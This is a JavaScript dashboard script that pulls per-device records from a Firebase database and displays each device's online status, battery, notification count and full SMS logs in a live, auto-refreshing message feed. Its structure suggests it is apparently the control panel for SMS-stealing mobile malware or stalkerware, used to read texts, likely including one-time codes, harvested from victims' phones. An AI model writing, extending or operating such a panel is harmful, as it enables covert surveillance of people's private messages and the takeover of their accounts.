// Configuration
const API_BASE = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
const USERS_URL = `${API_BASE}/users.json?shallow=true`;

let allUsers = {};
let showOnlyOnline = false;
let refreshInterval = null;
let feedMessages = [];

// === Toggle Function ===
function toggleDevices() {
    const allBtn = document.getElementById('toggleBtn');
    const onlineBtn = document.getElementById('toggleBtnOnline');
    
    if (showOnlyOnline) {
        showOnlyOnline = false;
        allBtn.classList.add('active');
        onlineBtn.classList.remove('active');
        document.getElementById('devicesTitle').textContent = '📱 All Devices';
    } else {
        showOnlyOnline = true;
        onlineBtn.classList.add('active');
        allBtn.classList.remove('active');
        document.getElementById('devicesTitle').textContent = '🟢 Online Only';
    }
    
    renderDevices();
}

// === Data Fetching ===
async function fetchUserIds() {
    try {
        const response = await fetch(USERS_URL);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        const data = await response.json();
        return Object.keys(data);
    } catch (error) {
        console.error('Error fetching user IDs:', error);
        return [];
    }
}

async function fetchUserData(userId) {
    try {
        const url = `${API_BASE}/users/${userId}.json`;
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        return await response.json();
    } catch (error) {
        console.error(`Error fetching user ${userId}:`, error);
        return null;
    }
}

function parseTimestamp(timestamp) {
    if (!timestamp) return 'N/A';
    if (typeof timestamp === 'number') {
        return new Date(timestamp).toLocaleString();
    }
    if (typeof timestamp === 'string') {
        const date = new Date(timestamp);
        if (!isNaN(date.getTime())) {
            return date.toLocaleString();
        }
        return timestamp;
    }
    return String(timestamp);
}

function isUserOnline(userData) {
    if (userData && userData.status) {
        return userData.status.isOnline === true;
    }
    return false;
}

function getLastSeen(userData) {
    if (userData && userData.status && userData.status.lastSeen) {
        return parseTimestamp(userData.status.lastSeen);
    }
    return 'N/A';
}

function getSmsCount(userData) {
    if (userData && userData.sms_logs) {
        return Object.keys(userData.sms_logs).length;
    }
    return 0;
}

function getLatestSms(userData) {
    if (userData && userData.sms_logs) {
        const smsEntries = Object.entries(userData.sms_logs);
        if (smsEntries.length === 0) return null;
        smsEntries.sort((a, b) => {
            const tsA = a[1].timestamp || 0;
            const tsB = b[1].timestamp || 0;
            return tsB - tsA;
        });
        return smsEntries[0][1];
    }
    return null;
}

function getAllSms(userData) {
    if (userData && userData.sms_logs) {
        const smsEntries = Object.entries(userData.sms_logs);
        smsEntries.sort((a, b) => {
            const tsA = a[1].timestamp || 0;
            const tsB = b[1].timestamp || 0;
            return tsB - tsA;
        });
        return smsEntries.map(entry => entry[1]);
    }
    return [];
}

function getNotificationsCount(userData) {
    if (userData && userData.notifications) {
        return Object.keys(userData.notifications).length;
    }
    return 0;
}

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// === Render Functions ===
function renderDeviceCard(userId, userData) {
    const online = isUserOnline(userData);
    const smsCount = getSmsCount(userData);
    const latestSms = getLatestSms(userData);
    const lastSeen = getLastSeen(userData);
    const notifCount = getNotificationsCount(userData);
    const battery = userData?.status?.battery ?? 'N/A';

    const card = document.createElement('div');
    card.className = `device-card ${!online ? 'offline' : ''}`;
    card.id = `device-${userId}`;

    let smsHtml = '';
    if (latestSms) {
        smsHtml = `
            <div class="device-sms">
                <div class="sms-sender">${escapeHtml(latestSms.sender || 'Unknown')}</div>
                <div class="sms-message">${escapeHtml(latestSms.message || 'No message')}</div>
                <div class="sms-time">${parseTimestamp(latestSms.timestamp)}</div>
            </div>
        `;
    }

    card.innerHTML = `
        <div class="device-header">
            <span class="device-id">📱 ${userId.substring(0, 10)}...</span>
            <span class="online-status ${online ? 'status-online' : 'status-offline'}">
                ${online ? '🟢 ONLINE' : '⚫ OFFLINE'}
            </span>
        </div>
        <div class="device-info">
            <span>🔋 ${battery}%</span>
            <span>📨 ${smsCount} SMS</span>
            <span>🔔 ${notifCount} Notifications</span>
            <span>⏰ ${lastSeen}</span>
        </div>
        ${smsHtml}
    `;

    return card;
}

function renderDevices() {
    const grid = document.getElementById('devicesGrid');
    const loading = document.getElementById('loadingIndicator');
    
    loading.style.display = 'none';
    grid.innerHTML = '';

    const usersToShow = showOnlyOnline 
        ? Object.fromEntries(Object.entries(allUsers).filter(([id, data]) => isUserOnline(data)))
        : allUsers;

    const userIds = Object.keys(usersToShow);
    
    if (userIds.length === 0) {
        grid.innerHTML = `<div class="no-devices">${showOnlyOnline ? 'No online devices' : 'No devices found'}</div>`;
        return;
    }

    const fragment = document.createDocumentFragment();
    userIds.forEach(userId => {
        const card = renderDeviceCard(userId, usersToShow[userId]);
        fragment.appendChild(card);
    });
    grid.appendChild(fragment);
}

function renderMessageFeed() {
    const feed = document.getElementById('messageFeed');
    if (feedMessages.length === 0) {
        feed.innerHTML = '<div class="placeholder">Waiting for messages...</div>';
        return;
    }

    const recentMessages = feedMessages.slice(0, 50);
    feed.innerHTML = recentMessages.map(msg => `
        <div class="feed-item">
            <div class="feed-header">
                <span class="feed-device">📱 ${escapeHtml(msg.deviceId.substring(0, 10))}...</span>
                <span class="feed-time">${parseTimestamp(msg.timestamp)}</span>
            </div>
            <div class="feed-message">${escapeHtml(msg.message)}</div>
        </div>
    `).join('');
}

function updateStats() {
    const userIds = Object.keys(allUsers);
    const total = userIds.length;
    let online = 0;
    let totalSms = 0;

    userIds.forEach(userId => {
        if (isUserOnline(allUsers[userId])) online++;
        totalSms += getSmsCount(allUsers[userId]);
    });

    document.getElementById('onlineCount').textContent = online;
    document.getElementById('smsCount').textContent = totalSms;
    document.getElementById('lastUpdate').textContent = `Last update: ${new Date().toLocaleString()}`;
}

// === Main Fetch Function ===
async function fetchAllData() {
    const refreshBtn = document.getElementById('refreshBtn');
    const loading = document.getElementById('loadingIndicator');
    const grid = document.getElementById('devicesGrid');
    
    refreshBtn.disabled = true;
    loading.style.display = 'block';
    grid.innerHTML = '';

    try {
        const userIds = await fetchUserIds();
        
        if (userIds.length === 0) {
            grid.innerHTML = '<div class="no-devices">No devices found in database</div>';
            loading.style.display = 'none';
            return;
        }

        const fetchPromises = userIds.map(userId => fetchUserData(userId));
        const usersDataArray = await Promise.all(fetchPromises);

        const newUsers = {};
        userIds.forEach((userId, index) => {
            if (usersDataArray[index]) {
                newUsers[userId] = usersDataArray[index];
            }
        });

        allUsers = newUsers;

        // Update message feed
        const newMessages = [];
        for (const userId in newUsers) {
            const smsList = getAllSms(newUsers[userId]);
            smsList.forEach(sms => {
                if (sms && sms.message) {
                    newMessages.push({
                        deviceId: userId,
                        message: sms.message,
                        timestamp: sms.timestamp || Date.now()
                    });
                }
            });
        }
        newMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        feedMessages = newMessages;

        renderMessageFeed();
        renderDevices();
        updateStats();

    } catch (error) {
        console.error('Error fetching data:', error);
        grid.innerHTML = `
            <div class="no-devices">
                ❌ Error: ${error.message}
                <br><br>
                <button onclick="fetchAllData()" style="background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:8px 20px;border-radius:8px;cursor:pointer;">Retry</button>
            </div>
        `;
    } finally {
        refreshBtn.disabled = false;
        loading.style.display = 'none';
    }
}

function startAutoRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
    refreshInterval = setInterval(fetchAllData, 30000);
}

// === Auto-Load on Page Load ===
document.addEventListener('DOMContentLoaded', () => {
    // Load data immediately
    fetchAllData();
    startAutoRefresh();

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        if (refreshInterval) {
            clearInterval(refreshInterval);
        }
    });
});

// Make functions globally accessible
window.toggleDevices = toggleDevices;
window.fetchAllData = fetchAllData;
